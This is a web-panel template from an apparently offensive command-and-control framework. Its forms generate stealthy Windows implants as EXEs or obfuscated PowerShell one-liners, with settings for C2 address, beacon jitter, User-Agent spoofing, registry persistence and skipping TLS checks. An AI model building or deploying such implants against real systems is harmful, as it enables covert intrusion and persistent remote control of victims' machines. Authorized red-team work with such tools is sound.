{{define "generate_content"}}
<div class="max-w-4xl mx-auto">
    <div class="mb-8">
        <h1 class="text-3xl font-semibold tracking-tight text-slate-900">生成 Agent</h1>
        <p class="text-slate-500">创建 Windows 植入程序（EXE 或 PowerShell）</p>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <!-- EXE 生成器 -->
        <div class="bg-white border border-slate-200 rounded-3xl p-8 shadow-sm">
            <div class="flex items-center gap-x-3 mb-6">
                <div class="w-10 h-10 bg-orange-100 text-orange-600 rounded-2xl flex items-center justify-center text-2xl">🪟</div>
                <div>
                    <div class="font-semibold text-lg text-slate-900">Windows EXE</div>
                    <div class="text-xs text-slate-500">原生 Go 植入程序 • 高度隐蔽</div>
                </div>
            </div>

            <form id="exe-form" class="space-y-5">
                <div>
                    <label class="block text-xs section-header mb-1.5">C2 服务器地址</label>
                    <input type="text" name="c2_url" value="{{.DefaultC2}}"
                           class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                </div>

                <div>
                    <label class="block text-xs section-header mb-1.5">通信协议</label>
                    <select name="protocol" class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                        <option value="http" selected>HTTP (REST API)</option>
                        <option value="tcp">TCP (Raw Socket)</option>
                    </select>
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="block text-xs section-header mb-1.5">心跳间隔（秒）</label>
                        <input type="number" name="interval" value="{{.DefaultInt}}"
                               class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                    </div>
                    <div>
                        <label class="block text-xs section-header mb-1.5">抖动值 (%)</label>
                        <input type="number" name="jitter" value="{{.DefaultJitter}}"
                               class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                    </div>
                </div>

                <div>
                    <label class="block text-xs section-header mb-1.5">User-Agent</label>
                    <input type="text" name="user_agent" value="{{.DefaultUA}}"
                           class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs">
                </div>

                <div class="flex items-center gap-x-2">
                    <input type="checkbox" name="persist" id="persist-exe" class="w-4 h-4 accent-indigo-600">
                    <label for="persist-exe" class="text-sm text-slate-700">启用持久化（注册表自启动）</label>
                </div>

                <div class="flex items-center gap-x-2">
                    <input type="checkbox" name="skip_tls_verify" id="skip-tls-exe" class="w-4 h-4 accent-indigo-600" {{if .DefaultSkipTLS}}checked{{end}}>
                    <label for="skip-tls-exe" class="text-sm text-slate-700">跳过 TLS 证书验证（自签名证书推荐）</label>
                </div>

                <div>
                    <label class="block text-xs section-header mb-1.5">文件名</label>
                    <input type="text" name="filename" value="forge_agent.exe"
                           class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                </div>

                <button type="button" onclick="generateEXE()"
                        class="w-full h-12 bg-orange-600 hover:bg-orange-700 transition-colors text-white font-medium rounded-2xl flex items-center justify-center gap-x-2">
                    <i class="fa-solid fa-download"></i>
                    生成 EXE
                </button>
            </form>

            <div id="exe-result" class="mt-4"></div>
        </div>

        <!-- PowerShell 生成器 -->
        <div class="bg-white border border-slate-200 rounded-3xl p-8 shadow-sm">
            <div class="flex items-center gap-x-3 mb-6">
                <div class="w-10 h-10 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center text-2xl">🐚</div>
                <div>
                    <div class="font-semibold text-lg text-slate-900">PowerShell 脚本</div>
                    <div class="text-xs text-slate-500">高度混淆 • 易于部署</div>
                </div>
            </div>

            <form id="ps1-form" class="space-y-5">
                <!-- 复用与 EXE 相同的表单字段 -->
                <div>
                    <label class="block text-xs section-header mb-1.5">C2 服务器地址</label>
                    <input type="text" name="c2_url" value="{{.DefaultC2}}"
                           class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                </div>

                <div>
                    <label class="block text-xs section-header mb-1.5">通信协议</label>
                    <select name="protocol" class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                        <option value="http" selected>HTTP (REST API)</option>
                        <option value="tcp">TCP (Raw Socket)</option>
                    </select>
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="block text-xs section-header mb-1.5">心跳间隔（秒）</label>
                        <input type="number" name="interval" value="{{.DefaultInt}}"
                               class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                    </div>
                    <div>
                        <label class="block text-xs section-header mb-1.5">抖动值 (%)</label>
                        <input type="number" name="jitter" value="{{.DefaultJitter}}"
                               class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                    </div>
                </div>

                <div>
                    <label class="block text-xs section-header mb-1.5">User-Agent</label>
                    <input type="text" name="user_agent" value="{{.DefaultUA}}"
                           class="w-full bg-white border border-slate-300 focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs">
                </div>

                <div class="flex items-center gap-x-2">
                    <input type="checkbox" name="persist" id="persist-ps1" class="w-4 h-4 accent-indigo-600">
                    <label for="persist-ps1" class="text-sm text-slate-700">启用持久化</label>
                </div>

                <div class="flex items-center gap-x-2">
                    <input type="checkbox" name="skip_tls_verify" id="skip-tls-ps1" class="w-4 h-4 accent-indigo-600" {{if .DefaultSkipTLS}}checked{{end}}>
                    <label for="skip-tls-ps1" class="text-sm text-slate-700">跳过 TLS 证书验证（自签名证书推荐）</label>
                </div>

                <button type="button" onclick="generatePS1()"
                        class="w-full h-12 bg-blue-600 hover:bg-blue-700 transition-colors text-white font-medium rounded-2xl flex items-center justify-center gap-x-2">
                    <i class="fa-solid fa-magic"></i>
                    生成混淆 PS1
                </button>
            </form>

            <div id="ps1-result" class="mt-4"></div>
        </div>
    </div>

    <div class="mt-8 text-center text-xs text-slate-400">
        生成的 Agent 将定时回连您的 C2 服务器。<br>
        <span class="text-amber-600">⚠️ 仅限授权的渗透测试使用</span>
    </div>
</div>

<script>
    function getFormData(formId) {
        const form = document.getElementById(formId);
        const formData = new FormData(form);
        const persistEl = document.getElementById(formId).querySelector('input[name="persist"]');
        if (persistEl) formData.set('persist', persistEl.checked ? 'true' : '');
        const skipEl = document.getElementById(formId).querySelector('input[name="skip_tls_verify"]');
        if (skipEl) formData.set('skip_tls_verify', skipEl.checked ? 'true' : '');
        return formData;
    }

    async function generateEXE() {
        const formData = getFormData('exe-form');
        document.getElementById('exe-result').innerHTML = '<div class="text-sm text-slate-500"><i class="fa-solid fa-spinner fa-spin"></i> 正在生成 EXE...</div>';

        try {
            const response = await fetch('/generate/exe', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                const blob = await response.blob();
                const contentDisposition = response.headers.get('Content-Disposition');
                let filename = 'forge_agent.exe';
                if (contentDisposition) {
                    const match = contentDisposition.match(/filename=(.+)/);
                    if (match) filename = match[1].replace(/"/g, '');
                }
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                a.remove();
                showToast('EXE 生成并下载成功！', 'success');
            } else {
                const text = await response.text();
                document.getElementById('exe-result').innerHTML = '<div class="text-sm text-red-500">错误: ' + text + '</div>';
            }
        } catch (err) {
            document.getElementById('exe-result').innerHTML = '<div class="text-sm text-red-500">错误: ' + err.message + '</div>';
        }
    }

    async function generatePS1() {
        const formData = getFormData('ps1-form');
        document.getElementById('ps1-result').innerHTML = '<div class="text-sm text-slate-500"><i class="fa-solid fa-spinner fa-spin"></i> 正在生成混淆 PowerShell...</div>';

        try {
            const response = await fetch('/generate/ps1', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                const data = await response.json();
                if (data.success) {
                    document.getElementById('ps1-result').innerHTML = `
                        <div class="mt-4">
                            <div class="flex items-center justify-between mb-2">
                                <span class="text-xs text-emerald-600 font-medium">
                                    <i class="fa-solid fa-check-circle"></i> 生成成功！
                                    原始: ${data.original_length} 字节 → 混淆后: ${data.obfuscated_len} 字节
                                </span>
                                <button onclick="copyToClipboard()" class="text-xs px-3 py-1 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl flex items-center gap-x-1">
                                    <i class="fa-solid fa-copy"></i> 复制
                                </button>
                            </div>
                            <textarea id="ps1-code" readonly class="w-full h-64 bg-slate-900 text-emerald-400 font-mono text-xs rounded-xl p-4 border border-slate-700 resize-none">${escapeHtml(data.code)}</textarea>
                    <div class="mt-2 text-xs text-slate-500">
                                <i class="fa-solid fa-info-circle"></i> 这是<span class="text-emerald-600 font-medium">一键执行命令</span> - 直接在 PowerShell 中粘贴执行即可
                            </div>
                        </div>
                    `;
                }
            } else {
                const text = await response.text();
                document.getElementById('ps1-result').innerHTML = '<div class="text-sm text-red-500">错误: ' + text + '</div>';
            }
        } catch (err) {
            document.getElementById('ps1-result').innerHTML = '<div class="text-sm text-red-500">错误: ' + err.message + '</div>';
        }
    }

    function copyToClipboard() {
        const code = document.getElementById('ps1-code').value;
        navigator.clipboard.writeText(code).then(() => {
            showToast('代码已复制到剪贴板！', 'success');
        }).catch(() => {
            // Fallback
            const textarea = document.getElementById('ps1-code');
            textarea.select();
            document.execCommand('copy');
            showToast('代码已复制！', 'success');
        });
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Helper to get CSRF token (required for POST requests)
    function getCSRFToken() {
        if (window.getCSRFToken) return window.getCSRFToken();
        const value = `; ${document.cookie}`;
        const parts = value.split(`; csrf_token=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return '';
    }
</script>
{{end}}
